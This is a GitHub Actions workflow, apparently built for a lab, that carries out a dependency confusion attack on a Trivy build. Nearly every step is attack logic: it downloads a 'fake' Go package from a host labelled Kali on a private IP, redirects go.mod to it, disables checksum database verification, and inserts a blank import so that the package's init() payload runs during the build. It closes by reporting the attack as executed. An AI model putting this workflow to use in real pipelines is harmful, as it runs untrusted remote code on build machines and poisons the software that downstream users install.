name: Build with Fake Dependency
on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  build:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      
      - name: Set up Go
        uses: actions/setup-go@v5
        with:
          go-version: '1.22'
      
      - name: Download fake dependency from Kali
        shell: powershell
        run: |
          $url = "http://192.168.56.101:8889/github.com/aquasecurity/trivy-db-fake/@v/v1.0.0.zip"
          $zipFile = "$env:TEMP\trivy-db-fake.zip"
          $extractDir = "$env:TEMP\trivy-db-fake"
          
          Write-Host "Downloading from untrusted source..."
          Invoke-WebRequest -Uri $url -OutFile $zipFile -TimeoutSec 15
          
          if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }
          Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force
          
          Get-ChildItem $extractDir
          Write-Host "Fake dependency ready at: $extractDir"
      
      - name: Configure Go to use fake dependency
        shell: powershell
        run: |
          $extractDir = "$env:TEMP\trivy-db-fake"
          $goPath = $extractDir.Replace("\", "/")
          
          Write-Host "Adding replace directive..."
          go mod edit -replace github.com/aquasecurity/trivy-db-fake=$goPath
          
          Write-Host "Disabling sumdb for fake package..."
          go env -w GONOSUMDB="github.com/aquasecurity/trivy-db-fake"
          
          Write-Host "Adding fake dependency to go.mod..."
          go mod edit -require github.com/aquasecurity/trivy-db-fake@v1.0.0
      
      - name: Create import file to trigger init()
        shell: powershell
        run: |
          $importFile = "cmd/trivy/fake_import.go"
          $content = "package main`n`nimport _ `"github.com/aquasecurity/trivy-db-fake`"`n"
          Set-Content -Path $importFile -Value $content
          Write-Host "Created import file to trigger init():"
          Get-Content $importFile
      
      - name: Download and build (triggers payload)
        shell: powershell
        run: |
          Write-Host "Downloading dependencies..."
          go mod download
          
          Write-Host "Building Trivy (this triggers the init() of fake package)..."
          go build -o dist/trivy.exe ./cmd/trivy
          Write-Host "Build completed!"
      
      - name: Verify fake package was imported
        shell: powershell
        run: |
          Write-Host "Checking if fake package is in dependency list..."
          go list -m all | Select-String "trivy-db-fake"
          Write-Host "Dependency confusion attack executed successfully!"
